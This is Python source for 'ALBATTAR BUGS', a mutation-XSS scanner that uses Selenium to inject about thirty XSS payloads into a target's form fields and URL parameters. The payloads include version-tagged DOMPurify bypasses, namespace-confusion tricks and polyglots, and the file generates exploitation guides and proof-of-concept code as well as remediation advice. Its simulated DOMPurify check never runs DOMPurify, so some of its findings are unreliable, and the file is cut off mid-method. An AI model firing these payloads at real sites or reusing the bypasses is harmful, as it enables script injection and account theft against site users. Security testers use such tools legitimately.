"""
╔══════════════════════════════════════════════════════════════╗
║         ⚔️  ALBATTAR BUGS - Mutation XSS Scanner  ⚔️        ║
║              Created by ROBIN | @ll bUg                     ║
╚══════════════════════════════════════════════════════════════╝

Mutation XSS (mXSS) Scanner
---------------------------
يكتشف ثغرات XSS التي تحدث بعد معالجة DOM للمدخلات
مثل innerHTML, DOMPurify bypasses, Browser quirks
"""

import re
import time
import json
import hashlib
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, quote, unquote
from bs4 import BeautifulSoup
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException

from core.base_scanner import BaseScanner
from core.http_handler import HTTPHandler
from utils.logger import Logger
from utils.colors import Colors


class MutationXSSScanner(BaseScanner):
    """
    ماسح Mutation XSS المتقدم
    يكتشف ثغرات XSS التي تظهر بعد معالجة المتصفح للكود
    """
    
    def __init__(self, target: str, config: Dict = None):
        super().__init__(target, config)
        self.name = "Mutation XSS Scanner"
        self.description = "Detects XSS after DOM mutations and browser parsing"
        self.severity = "HIGH"
        
        self.logger = Logger(__name__)
        self.colors = Colors()
        self.http_handler = HTTPHandler(config)
        
        # إعدادات Selenium
        self.driver = None
        self.setup_selenium()
        
        # Mutation XSS Payloads
        self.mxss_payloads = self._load_mxss_payloads()
        
        # Browser quirks patterns
        self.browser_quirks = self._load_browser_quirks()
        
        # DOMPurify bypass techniques
        self.dompurify_bypasses = self._load_dompurify_bypasses()
        
        # Mutation patterns
        self.mutation_patterns = self._load_mutation_patterns()
        
        # Unique marker for testing
        self.test_marker = self._generate_marker()
        
        # Results storage
        self.vulnerabilities = []
        
    def setup_selenium(self):
        """إعداد Selenium WebDriver"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--log-level=3')
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(30)
            self.logger.info("Selenium WebDriver initialized")
            
        except Exception as e:
            self.logger.error(f"Failed to initialize Selenium: {str(e)}")
            self.driver = None
    
    def _generate_marker(self) -> str:
        """توليد علامة فريدة للاختبار"""
        timestamp = str(time.time()).replace('.', '')
        return f"mxss_{hashlib.md5(timestamp.encode()).hexdigest()[:8]}"
    
    def _load_mxss_payloads(self) -> List[Dict]:
        """تحميل payloads لـ Mutation XSS"""
        return [
            # ═══════════════════════════════════════════════════
            # 1. innerHTML Mutations
            # ═══════════════════════════════════════════════════
            {
                "name": "innerHTML img src mutation",
                "payload": '<img src=x onerror="alert({marker})">',
                "context": "innerHTML",
                "technique": "Direct innerHTML injection",
                "expected_mutation": "Browser executes onerror"
            },
            {
                "name": "innerHTML with encoded quotes",
                "payload": '<img src=x onerror=&quot;alert({marker})&quot;>',
                "context": "innerHTML",
                "technique": "HTML entity encoding bypass",
                "expected_mutation": "Entities decoded by browser"
            },
            {
                "name": "innerHTML SVG mutation",
                "payload": '<svg/onload=alert({marker})>',
                "context": "innerHTML",
                "technique": "SVG event handler",
                "expected_mutation": "SVG onload fires"
            },
            
            # ═══════════════════════════════════════════════════
            # 2. Namespace Confusion
            # ═══════════════════════════════════════════════════
            {
                "name": "MathML namespace confusion",
                "payload": '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert({marker})>',
                "context": "innerHTML",
                "technique": "MathML namespace switching",
                "expected_mutation": "Context switches to HTML"
            },
            {
                "name": "SVG namespace confusion",
                "payload": '<svg><style><img src=x onerror=alert({marker})></style>',
                "context": "innerHTML",
                "technique": "SVG style tag exploitation",
                "expected_mutation": "Breaks out of style context"
            },
            {
                "name": "Foreign object mutation",
                "payload": '<svg><foreignObject><img src=x onerror=alert({marker})></foreignObject>',
                "context": "innerHTML",
                "technique": "SVG foreignObject HTML injection",
                "expected_mutation": "HTML context inside SVG"
            },
            
            # ═══════════════════════════════════════════════════
            # 3. DOMPurify Bypasses
            # ═══════════════════════════════════════════════════
            {
                "name": "DOMPurify mXSS #1",
                "payload": '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert({marker})>',
                "context": "DOMPurify",
                "technique": "Nested form confusion",
                "expected_mutation": "Form parsing breaks sanitization"
            },
            {
                "name": "DOMPurify mXSS #2",
                "payload": '<svg><style><img src=x onerror=alert({marker})>',
                "context": "DOMPurify",
                "technique": "SVG style content",
                "expected_mutation": "Style context breakout"
            },
            {
                "name": "DOMPurify mXSS #3",
                "payload": '<noscript><style></noscript><img src=x onerror=alert({marker})>',
                "context": "DOMPurify",
                "technique": "Noscript style confusion",
                "expected_mutation": "Noscript content mutation"
            },
            {
                "name": "DOMPurify template mutation",
                "payload": '<template><style><img src onerror=alert({marker})></style></template>',
                "context": "DOMPurify",
                "technique": "Template content extraction",
                "expected_mutation": "Template content becomes active"
            },
            
            # ═══════════════════════════════════════════════════
            # 4. Browser Quirks
            # ═══════════════════════════════════════════════════
            {
                "name": "Safari backslash mutation",
                "payload": '<img src=x onerror=\\"alert({marker})\\">',
                "context": "Safari",
                "technique": "Backslash escape handling",
                "expected_mutation": "Safari parses backslashes differently"
            },
            {
                "name": "Firefox namespace mutation",
                "payload": '<svg><desc><style><img src=x onerror=alert({marker})>',
                "context": "Firefox",
                "technique": "SVG desc tag behavior",
                "expected_mutation": "Firefox specific namespace handling"
            },
            {
                "name": "Chrome mXSS via select",
                "payload": '<select><style></select><img src=x onerror=alert({marker})>',
                "context": "Chrome",
                "technique": "Select tag mutation",
                "expected_mutation": "Chrome specific parsing"
            },
            
            # ═══════════════════════════════════════════════════
            # 5. Encoded Mutations
            # ═══════════════════════════════════════════════════
            {
                "name": "Unicode normalization mXSS",
                "payload": '<img src=x onerror="alert\u0028{marker}\u0029">',
                "context": "Unicode",
                "technique": "Unicode escape sequences",
                "expected_mutation": "Unicode decoded by browser"
            },
            {
                "name": "Mixed encoding mutation",
                "payload": '<img src=x onerror=&quot;&#97;&#108;&#101;&#114;&#116;({marker})&quot;>',
                "context": "Mixed encoding",
                "technique": "HTML entities + HTML encoding",
                "expected_mutation": "Multiple decoding passes"
            },
            {
                "name": "UTF-7 mutation",
                "payload": '+ADw-img src=x onerror=alert({marker})+AD4-',
                "context": "UTF-7",
                "technique": "UTF-7 encoding",
                "expected_mutation": "UTF-7 decoded to HTML"
            },
            
            # ═══════════════════════════════════════════════════
            # 6. CSS Mutations
            # ═══════════════════════════════════════════════════
            {
                "name": "CSS expression mXSS",
                "payload": '<style>*{x:expression(alert({marker}))}</style>',
                "context": "CSS",
                "technique": "IE CSS expression",
                "expected_mutation": "CSS executed as JavaScript"
            },
            {
                "name": "CSS import mutation",
                "payload": '<style>@import "javascript:alert({marker})";</style>',
                "context": "CSS",
                "technique": "CSS @import with javascript:",
                "expected_mutation": "Import executes JavaScript"
            },
            {
                "name": "CSS background mutation",
                "payload": '<div style="background:url(javascript:alert({marker}))">',
                "context": "CSS",
                "technique": "CSS background with javascript:",
                "expected_mutation": "Background URL executed"
            },
            
            # ═══════════════════════════════════════════════════
            # 7. Comment-based Mutations
            # ═══════════════════════════════════════════════════
            {
                "name": "Comment breakout mXSS",
                "payload": '<!--><img src=x onerror=alert({marker})>-->',
                "context": "Comments",
                "technique": "Comment termination",
                "expected_mutation": "Breaks out of comment context"
            },
            {
                "name": "Conditional comment mutation",
                "payload": '<!--[if]><img src=x onerror=alert({marker})><![endif]-->',
                "context": "IE conditional",
                "technique": "IE conditional comments",
                "expected_mutation": "IE parses content"
            },
            {
                "name": "CDATA mutation",
                "payload": '<![CDATA[<img src=x onerror=alert({marker})>]]>',
                "context": "CDATA",
                "technique": "CDATA section",
                "expected_mutation": "CDATA content becomes active"
            },
            
            # ═══════════════════════════════════════════════════
            # 8. Mutation via DOM APIs
            # ═══════════════════════════════════════════════════
            {
                "name": "insertAdjacentHTML mutation",
                "payload": '<img src=x onerror=alert({marker})>',
                "context": "insertAdjacentHTML",
                "technique": "DOM API mutation",
                "expected_mutation": "Content mutated during insertion"
            },
            {
                "name": "createContextualFragment mutation",
                "payload": '<svg><style><img src=x onerror=alert({marker})>',
                "context": "createContextualFragment",
                "technique": "Range API mutation",
                "expected_mutation": "Context changes during parsing"
            },
            
            # ═══════════════════════════════════════════════════
            # 9. Advanced mXSS Techniques
            # ═══════════════════════════════════════════════════
            {
                "name": "Mutation via title tag",
                "payload": '<title><style><img src=x onerror=alert({marker})></title>',
                "context": "title tag",
                "technique": "Title tag content mutation",
                "expected_mutation": "Title content becomes executable"
            },
            {
                "name": "Mutation via textarea",
                "payload": '<textarea><style><img src=x onerror=alert({marker})></textarea>',
                "context": "textarea",
                "technique": "Textarea content breakout",
                "expected_mutation": "Textarea parsing quirk"
            },
            {
                "name": "Mutation via noembed",
                "payload": '<noembed><style><img src=x onerror=alert({marker})></noembed>',
                "context": "noembed",
                "technique": "Noembed tag mutation",
                "expected_mutation": "Noembed content activation"
            },
            
            # ═══════════════════════════════════════════════════
            # 10. Polyglot mXSS
            # ═══════════════════════════════════════════════════
            {
                "name": "Polyglot mXSS #1",
                "payload": 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert({marker})>//',
                "context": "polyglot",
                "technique": "Multi-context polyglot",
                "expected_mutation": "Works in multiple contexts"
            },
            {
                "name": "Polyglot mXSS #2",
                "payload": '<!--<img src=--><img src=x onerror=alert({marker})//>',
                "context": "polyglot",
                "technique": "Comment confusion polyglot",
                "expected_mutation": "Comment parsing confusion"
            }
        ]
    
    def _load_browser_quirks(self) -> Dict:
        """تحميل browser-specific quirks"""
        return {
            "chrome": [
                "Select tag parsing differences",
                "Template content handling",
                "SVG foreignObject behavior"
            ],
            "firefox": [
                "Namespace handling differences",
                "SVG desc tag behavior",
                "MathML parsing quirks"
            ],
            "safari": [
                "Backslash escape handling",
                "Style tag in SVG",
                "Form nesting behavior"
            ],
            "edge": [
                "Legacy IE behavior",
                "Conditional comments",
                "CSS expression (legacy)"
            ]
        }
    
    def _load_dompurify_bypasses(self) -> List[Dict]:
        """تحميل DOMPurify bypass techniques"""
        return [
            {
                "version": "< 2.0.0",
                "technique": "Nested form tags",
                "payload": '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert({marker})>'
            },
            {
                "version": "< 2.0.7",
                "technique": "SVG style mutation",
                "payload": '<svg><style><img src=x onerror=alert({marker})>'
            },
            {
                "version": "< 2.3.0",
                "technique": "Noscript style confusion",
                "payload": '<noscript><style></noscript><img src=x onerror=alert({marker})>'
            },
            {
                "version": "All versions",
                "technique": "Template content extraction",
                "payload": '<template><style><img src onerror=alert({marker})></style></template>'
            }
        ]
    
    def _load_mutation_patterns(self) -> List[Dict]:
        """تحميل أنماط الـ mutations"""
        return [
            {
                "pattern": "innerHTML assignment",
                "risk": "HIGH",
                "description": "Direct innerHTML can cause mutations"
            },
            {
                "pattern": "DOMParser parseFromString",
                "risk": "MEDIUM",
                "description": "Parser may mutate content"
            },
            {
                "pattern": "insertAdjacentHTML",
                "risk": "HIGH",
                "description": "Can cause context mutations"
            },
            {
                "pattern": "document.write",
                "risk": "CRITICAL",
                "description": "Legacy API with mutations"
            },
            {
                "pattern": "createContextualFragment",
                "risk": "MEDIUM",
                "description": "Range API mutations possible"
            }
        ]
    
    def scan(self) -> List[Dict]:
        """
        بدء فحص Mutation XSS
        """
        self.logger.info(f"{self.colors.BLUE}Starting Mutation XSS scan on {self.target}{self.colors.RESET}")
        
        if not self.driver:
            self.logger.error("Selenium not available, cannot perform mXSS scan")
            return []
        
        try:
            # 1. Detect input points
            input_points = self._find_input_points()
            self.logger.info(f"Found {len(input_points)} input points")
            
            # 2. Test each input with mXSS payloads
            for input_point in input_points:
                self._test_input_point(input_point)
            
            # 3. Test innerHTML manipulations
            self._test_innerhtml_mutations()
            
            # 4. Test DOMPurify bypasses
            self._test_dompurify_bypasses()
            
            # 5. Test browser-specific quirks
            self._test_browser_quirks()
            
            # 6. Test DOM API mutations
            self._test_dom_api_mutations()
            
            self.logger.info(f"{self.colors.GREEN}Mutation XSS scan complete. Found {len(self.vulnerabilities)} vulnerabilities{self.colors.RESET}")
            
        except Exception as e:
            self.logger.error(f"Error during mXSS scan: {str(e)}")
        
        finally:
            if self.driver:
                self.driver.quit()
        
        return self.vulnerabilities
    
    def _find_input_points(self) -> List[Dict]:
        """البحث عن نقاط الإدخال"""
        input_points = []
        
        try:
            self.driver.get(self.target)
            time.sleep(2)
            
            # Find all input elements
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            textareas = self.driver.find_elements(By.TAG_NAME, "textarea")
            
            for element in inputs + textareas:
                try:
                    input_point = {
                        "element": element,
                        "type": element.get_attribute("type") or "text",
                        "name": element.get_attribute("name") or "unknown",
                        "id": element.get_attribute("id") or "unknown"
                    }
                    input_points.append(input_point)
                except:
                    continue
            
            # Find URL parameters
            if "?" in self.target:
                params = self.target.split("?")[1].split("&")
                for param in params:
                    if "=" in param:
                        param_name = param.split("=")[0]
                        input_points.append({
                            "type": "url_parameter",
                            "name": param_name,
                            "url": self.target
                        })
            
        except Exception as e:
            self.logger.error(f"Error finding input points: {str(e)}")
        
        return input_points
    
    def _test_input_point(self, input_point: Dict):
        """اختبار نقطة إدخال معينة"""
        for payload_data in self.mxss_payloads:
            try:
                # Replace marker with actual test string
                payload = payload_data["payload"].replace("{marker}", self.test_marker)
                
                # Inject payload
                if input_point["type"] == "url_parameter":
                    self._test_url_parameter(input_point, payload, payload_data)
                else:
                    self._test_form_input(input_point, payload, payload_data)
                
                time.sleep(0.5)  # Avoid rate limiting
                
            except Exception as e:
                self.logger.debug(f"Error testing input point: {str(e)}")
                continue
    
    def _test_form_input(self, input_point: Dict, payload: str, payload_data: Dict):
        """اختبار form input"""
        try:
            element = input_point["element"]
            
            # Clear and inject payload
            element.clear()
            element.send_keys(payload)
            
            # Wait for DOM mutations
            time.sleep(1)
            
            # Check if payload executed
            if self._check_xss_execution():
                self._report_vulnerability(
                    vuln_type="Mutation XSS (Form Input)",
                    input_name=input_point["name"],
                    payload=payload,
                    payload_data=payload_data,
                    context="Form input field"
                )
            
            # Check DOM for mutations
            mutations = self._detect_dom_mutations(payload)
            if mutations:
                self._report_vulnerability(
                    vuln_type="Potential Mutation XSS",
                    input_name=input_point["name"],
                    payload=payload,
                    payload_data=payload_data,
                    context="DOM mutation detected",
                    mutations=mutations
                )
                
        except Exception as e:
            self.logger.debug(f"Error testing form input: {str(e)}")
    
    def _test_url_parameter(self, input_point: Dict, payload: str, payload_data: Dict):
        """اختبار URL parameter"""
        try:
            # Build URL with payload
            base_url = input_point["url"].split("?")[0]
            params = input_point["url"].split("?")[1].split("&")
            
            new_params = []
            for param in params:
                if "=" in param:
                    param_name, param_value = param.split("=", 1)
                    if param_name == input_point["name"]:
                        new_params.append(f"{param_name}={quote(payload)}")
                    else:
                        new_params.append(param)
            
            test_url = f"{base_url}?{'&'.join(new_params)}"
            
            # Load URL
            self.driver.get(test_url)
            time.sleep(1)
            
            # Check for XSS execution
            if self._check_xss_execution():
                self._report_vulnerability(
                    vuln_type="Mutation XSS (URL Parameter)",
                    input_name=input_point["name"],
                    payload=payload,
                    payload_data=payload_data,
                    url=test_url,
                    context="URL parameter"
                )
            
            # Check for DOM mutations
            mutations = self._detect_dom_mutations(payload)
            if mutations:
                self._report_vulnerability(
                    vuln_type="Potential Mutation XSS (URL)",
                    input_name=input_point["name"],
                    payload=payload,
                    payload_data=payload_data,
                    url=test_url,
                    context="DOM mutation in URL parameter",
                    mutations=mutations
                )
                
        except Exception as e:
            self.logger.debug(f"Error testing URL parameter: {str(e)}")
    
    def _test_innerhtml_mutations(self):
        """اختبار innerHTML mutations"""
        self.logger.info("Testing innerHTML mutations...")
        
        innerHTML_payloads = [p for p in self.mxss_payloads if p["context"] == "innerHTML"]
        
        for payload_data in innerHTML_payloads:
            try:
                payload = payload_data["payload"].replace("{marker}", self.test_marker)
                
                # Inject via console
                script = f"""
                var testDiv = document.createElement('div');
                testDiv.innerHTML = `{payload}`;
                document.body.appendChild(testDiv);
                """
                
                self.driver.execute_script(script)
                time.sleep(1)
                
                if self._check_xss_execution():
                    self._report_vulnerability(
                        vuln_type="Mutation XSS (innerHTML)",
                        payload=payload,
                        payload_data=payload_data,
                        context="Direct innerHTML manipulation",
                        technique="innerHTML assignment"
                    )
                    
            except Exception as e:
                self.logger.debug(f"Error testing innerHTML: {str(e)}")
    
    def _test_dompurify_bypasses(self):
        """اختبار DOMPurify bypasses"""
        self.logger.info("Testing DOMPurify bypasses...")
        
        for bypass in self._load_dompurify_bypasses():
            try:
                payload = bypass["payload"].replace("{marker}", self.test_marker)
                
                # Simulate DOMPurify sanitization + innerHTML
                script = f"""
                // Simulate DOMPurify (simplified)
                var clean = `{payload}`;
                var testDiv = document.createElement('div');
                testDiv.innerHTML = clean;
                document.body.appendChild(testDiv);
                """
                
                self.driver.execute_script(script)
                time.sleep(1)
                
                if self._check_xss_execution():
                    self._report_vulnerability(
                        vuln_type="Mutation XSS (DOMPurify Bypass)",
                        payload=payload,
                        context="DOMPurify bypass",
                        technique=bypass["technique"],
                        affected_version=bypass["version"]
                    )
                    
            except Exception as e:
                self.logger.debug(f"Error testing DOMPurify bypass: {str(e)}")
    
    def _test_browser_quirks(self):
        """اختبار browser-specific quirks"""
        self.logger.info("Testing browser quirks...")
        
        browser_payloads = [p for p in self.mxss_payloads 
                           if p["context"] in ["Safari", "Firefox", "Chrome"]]
        
        for payload_data in browser_payloads:
            try:
                payload = payload_data["payload"].replace("{marker}", self.test_marker)
                
                script = f"""
                var testDiv = document.createElement('div');
                testDiv.innerHTML = `{payload}`;
                document.body.appendChild(testDiv);
                """
                
                self.driver.execute_script(script)
                time.sleep(1)
                
                if self._check_xss_execution():
                    self._report_vulnerability(
                        vuln_type="Mutation XSS (Browser Quirk)",
                        payload=payload,
                        payload_data=payload_data,
                        context=f"Browser-specific: {payload_data['context']}",
                        technique=payload_data["technique"]
                    )
                    
            except Exception as e:
                self.logger.debug(f"Error testing browser quirk: {str(e)}")
    
    def _test_dom_api_mutations(self):
        """اختبار DOM API mutations"""
        self.logger.info("Testing DOM API mutations...")
        
        dom_apis = [
            "insertAdjacentHTML",
            "createContextualFragment",
            "document.write"
        ]
        
        for api in dom_apis:
            for payload_data in self.mxss_payloads[:10]:  # Test subset
                try:
                    payload = payload_data["payload"].replace("{marker}", self.test_marker)
                    
                    if api == "insertAdjacentHTML":
                        script = f"""
                        var testDiv = document.createElement('div');
                        document.body.appendChild(testDiv);
                        testDiv.insertAdjacentHTML('beforeend', `{payload}`);
                        """
                    elif api == "createContextualFragment":
                        script = f"""
                        var range = document.createRange();
                        range.selectNode(document.body);
                        var fragment = range.createContextualFragment(`{payload}`);
                        document.body.appendChild(fragment);
                        """
                    elif api == "document.write":
                        script = f"document.write(`{payload}`);"
                    
                    self.driver.execute_script(script)
                    time.sleep(1)
                    
                    if self._check_xss_execution():
                        self._report_vulnerability(
                            vuln_type=f"Mutation XSS ({api})",
                            payload=payload,
                            payload_data=payload_data,
                            context=f"DOM API: {api}",
                            technique=payload_data["technique"]
                        )
                        
                except Exception as e:
                    self.logger.debug(f"Error testing {api}: {str(e)}")
    
    def _check_xss_execution(self) -> bool:
        """التحقق من تنفيذ XSS"""
        try:
            # Check for alert dialog
            WebDriverWait(self.driver, 2).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            alert.dismiss()
            
            # Check if our marker is in alert
            if self.test_marker in alert_text:
                return True
                
        except TimeoutException:
            pass
        except Exception as e:
            self.logger.debug(f"Error checking XSS: {str(e)}")
        
        return False
    
    def _detect_dom_mutations(self, payload: str) -> List[str]:
        """كشف تغييرات DOM"""
        mutations = []
        
        try:
            # Get page source before and after
            page_source = self.driver.page_source
            
            # Check for dangerous tags
            dangerous_tags = ['script', 'img', 'svg', 'iframe', 'object', 'embed']
            for tag in dangerous_tags:
                if f'<{tag}' in page_source.lower() and tag in payload.lower():
                    mutations.append(f"Dangerous tag '{tag}' found in DOM")
            
            # Check for event handlers
            event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover']
            for handler in event_handlers:
                if handler in page_source.lower() and handler in payload.lower():
                    mutations.append(f"Event handler '{handler}' found in DOM")
            
            # Check for javascript: protocol
            if 'javascript:' in page_source.lower() and 'javascript:' in payload.lower():
                mutations.append("javascript: protocol found in DOM")
            
            # Check for style mutations
            if '<style' in page_source.lower() and '<style' in payload.lower():
                mutations.append("Style tag mutation detected")
            
            # Check for namespace confusion
            namespaces = ['<math', '<svg', '<foreignobject']
            for ns in namespaces:
                if ns in page_source.lower() and ns in payload.lower():
                    mutations.append(f"Namespace element '{ns}' mutation detected")
            
        except Exception as e:
            self.logger.debug(f"Error detecting mutations: {str(e)}")
        
        return mutations
    
    def _report_vulnerability(self, vuln_type: str, payload: str, 
                            payload_data: Dict = None, **kwargs):
        """تسجيل ثغرة مكتشفة"""
        
        vulnerability = {
            "type": vuln_type,
            "severity": "HIGH",
            "url": self.target,
            "payload": payload,
            "confidence": self._calculate_confidence(kwargs),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "cvss_score": 8.2,
            "cwe": "CWE-79",
            "owasp": "A03:2021 - Injection"
        }
        
        # Add payload data if available
        if payload_data:
            vulnerability.update({
                "technique": payload_data.get("technique", "Unknown"),
                "expected_mutation": payload_data.get("expected_mutation", "N/A"),
                "payload_name": payload_data.get("name", "Unknown")
            })
        
        # Add additional context
        vulnerability.update(kwargs)
        
        # Add exploitation details
        vulnerability["exploitation"] = self._generate_exploitation_guide(
            vuln_type, payload, payload_data
        )
        
        # Add remediation
        vulnerability["remediation"] = self._generate_remediation(vuln_type)
        
        # Add impact assessment
        vulnerability["impact"] = self._assess_impact(vuln_type)
        
        self.vulnerabilities.append(vulnerability)
        
        self.logger.warning(
            f"{self.colors.RED}[VULN FOUND] {vuln_type}{self.colors.RESET}\n"
            f"  Payload: {payload[:100]}...\n"
            f"  Confidence: {vulnerability['confidence']}%"
        )
    
    def _calculate_confidence(self, details: Dict) -> int:
        """حساب نسبة الثقة في الثغرة"""
        confidence = 70  # Base confidence
        
        # If XSS actually executed
        if details.get("executed", False):
            confidence = 98
        
        # If DOM mutations detected
        if details.get("mutations"):
            confidence += 15
        
        # If known bypass technique
        if details.get("technique"):
            confidence += 10
        
        # If browser-specific
        if details.get("context") and "Browser" in details.get("context", ""):
            confidence += 5
        
        return min(confidence, 99)
    
    def _generate_exploitation_guide(self, vuln_type: str, payload: str, 
                                    payload_data: Dict = None) -> Dict:
        """توليد دليل الاستغلال"""
        
        guide = {
            "difficulty": "Medium to Hard",
            "requirements": [
                "Understanding of DOM mutations",
                "Knowledge of browser parsing quirks",
                "Ability to bypass sanitizers"
            ],
            "steps": []
        }
        
        if "innerHTML" in vuln_type:
            guide["steps"] = [
                "1. Identify innerHTML assignment in target application",
                "2. Inject payload that will mutate during parsing",
                "3. Payload: " + payload,
                "4. Browser will mutate the content and execute JavaScript",
                "5. Result: XSS execution after DOM mutation"
            ]
            guide["difficulty"] = "Medium"
            
        elif "DOMPurify" in vuln_type:
            guide["steps"] = [
                "1. Identify DOMPurify sanitization",
                "2. Use namespace confusion or nested tags",
                "3. Payload: " + payload,
                "4. DOMPurify will sanitize but mutation occurs after",
                "5. innerHTML assignment triggers the mutation",
                "6. Result: Bypass DOMPurify and execute XSS"
            ]
            guide["difficulty"] = "Hard"
            guide["requirements"].append("DOMPurify version detection")
            
        elif "Browser Quirk" in vuln_type:
            guide["steps"] = [
                "1. Identify target browser",
                "2. Use browser-specific parsing quirks",
                "3. Payload: " + payload,
                "4. Browser-specific mutation occurs",
                "5. Result: XSS execution via browser quirk"
            ]
            guide["difficulty"] = "Hard"
            guide["requirements"].append("Browser fingerprinting")
            
        else:
            guide["steps"] = [
                "1. Inject mutation XSS payload",
                "2. Payload: " + payload,
                "3. Wait for DOM mutation to occur",
                "4. JavaScript executes after mutation",
                "5. Result: Successful XSS execution"
            ]
        
        # Add technique-specific notes
        if payload_data:
            guide["technique"] = payload_data.get("technique", "N/A")
            guide["expected_behavior"] = payload_data.get("expected_mutation", "N/A")
        
        # Add PoC code
        guide["poc_code"] = self._generate_poc_code(payload)
        
        return guide
    
    def _generate_poc_code(self, payload: str) -> str:
        """توليد Proof of Concept code"""
        return f"""
// Proof of Concept - Mutation XSS
// DO NOT use on production without authorization

// Method 1: Direct innerHTML injection
var div = document.createElement('div');
div.innerHTML = `{payload}`;
document.body.appendChild(div);

// Method 2: Using insertAdjacentHTML
var target = document.querySelector('body');
target.insertAdjacentHTML('beforeend', `{payload}`);

// Method 3: Using DOMParser
var parser = new DOMParser();
var doc = parser.parseFromString(`{payload}`, 'text/html');
document.body.appendChild(doc.body.firstChild);

// Expected Result: JavaScript execution after DOM mutation
"""
    
    def _generate_remediation(self, vuln_type: str) -> Dict:
        """توليد توصيات الإصلاح"""
        
        remediation = {
            "priority": "HIGH",
            "recommendations": [],
            "code_examples": {},
            "references": []
        }
        
        # General mXSS remediation
        remediation["recommendations"].extend([
            "Never use innerHTML with user input",
            "Use textContent or innerText for text-only content",
            "If HTML is needed, use a strict sanitizer like DOMPurify (latest version)",
            "Implement Content Security Policy (CSP)",
            "Validate and encode all user input on server-side",
            "Use safe DOM APIs like createElement + textContent"
        ])
        
        # Secure code examples
        remediation["code_examples"] = {
            "vulnerable": """
// ❌ VULNERABLE CODE
function displayUserContent(userInput) {
    document.getElementById('content').innerHTML = userInput;
}
""",
            "secure_option_1": """
// ✅ SECURE CODE - Option 1: Use textContent
function displayUserContent(userInput) {
    document.getElementById('content').textContent = userInput;
}
""",
            "secure_option_2": """
// ✅ SECURE CODE - Option 2: Safe DOM manipulation
function displayUserContent(userInput) {
    var div = document.createElement('div');
    var text = document.createTextNode(userInput);
    div.appendChild(text);
    document.getElementById('content').appendChild(div);
}
""",
            "secure_option_3": """
// ✅ SECURE CODE - Option 3: DOMPurify + CSP
import DOMPurify from 'dompurify';

function displayUserContent(userInput) {
    // Use latest DOMPurify version
    var clean = DOMPurify.sanitize(userInput, {
        SAFE_FOR_TEMPLATES: true,
        ALLOW_DATA_ATTR: false
    });
    document.getElementById('content').innerHTML = clean;
}

// Add CSP header:
// Content-Security-Policy: default-src 'self'; script-src 'self'
"""
        }
        
        # Type-specific remediation
        if "innerHTML" in vuln_type:
            remediation["recommendations"].append(
                "Replace innerHTML with safer alternatives (textContent, createElement)"
            )
            
        elif "DOMPurify" in vuln_type:
            remediation["recommendations"].extend([
                "Update DOMPurify to latest version",
                "Review DOMPurify configuration",
                "Consider additional layers of defense (CSP, input validation)"
            ])
            
        elif "DOM API" in vuln_type:
            remediation["recommendations"].append(
                "Avoid legacy DOM APIs like document.write"
            )
        
        # Add references
        remediation["references"] = [
            "https://owasp.org/www-community/attacks/xss/",
            "https://cure53.de/fp170.pdf (DOMPurify bypass research)",
            "https://portswigger.net/research/bypassing-dompurify",
            "https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model",
            "https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations"
        ]
        
        return remediation
    
    def _assess_impact(self, vuln_type: str) -> Dict:
        """تقييم تأثير الثغرة"""
        
        impact = {
            "confidentiality": "HIGH",
            "integrity": "HIGH",
            "availability": "MEDIUM",
            "scope": "Changed",
            "description": ""
        }
        
        if "DOMPurify" in vuln_type:
            impact["description"] = (
                "Mutation XSS bypassing DOMPurify allows attackers to execute "
                "arbitrary JavaScript in the context of the victim's browser. "
                "This can lead to session hijacking, credential theft, malware "
                "distribution, and complete account takeover. The bypass of a "
                "security library makes this particularly severe."
            )
            impact["business_impact"] = [
                "User account compromise",
                "Data theft (cookies, tokens, personal info)",
                "Malware distribution to users",
                "Reputation damage",
                "Regulatory compliance violations (GDPR, PCI-DSS)"
            ]
            
        elif "innerHTML" in vuln_type:
            impact["description"] = (
                "innerHTML-based Mutation XSS allows execution of malicious "
                "JavaScript after DOM parsing mutations. Attackers can steal "
                "sensitive data, hijack user sessions, and perform actions on "
                "behalf of the victim."
            )
            impact["business_impact"] = [
                "Session hijacking",
                "Credential theft",
                "Phishing attacks",
                "Data exfiltration",
                "Cross-site request forgery"
            ]
            
        else:
            impact["description"] = (
                "Mutation XSS vulnerability allows attackers to bypass input "
                "validation and execute malicious code after browser parsing. "
                "This can compromise user accounts and sensitive data."
            )
            impact["business_impact"] = [
                "User data compromise",
                "Account takeover",
                "Malicious actions on behalf of users",
                "Brand reputation damage"
            ]
        
        # CVSS v3.1 breakdown
        impact["cvss_vector"] = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N"
        impact["cvss_breakdown"] = {
            "Attack Vector": "Network (AV:N)",
            "Attack Complexity": "Low (AC:L)",
            "Privileges Required": "None (PR:N)",
            "User Interaction": "Required (UI:R)",
            "Scope": "Changed (S:C)",
            "Confidentiality": "High (C:H)",
            "Integrity": "High (I:H)",
            "Availability": "None (A:N)"
        }
        
        return impact
    
    def generate_report(self) -> Dict:
        """توليد تقرير شامل"""
        
        report = {
            "scanner": self.name,
            "target": self.target,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
            "statistics": self._generate_statistics(),
            "summary": self._generate_summary(),
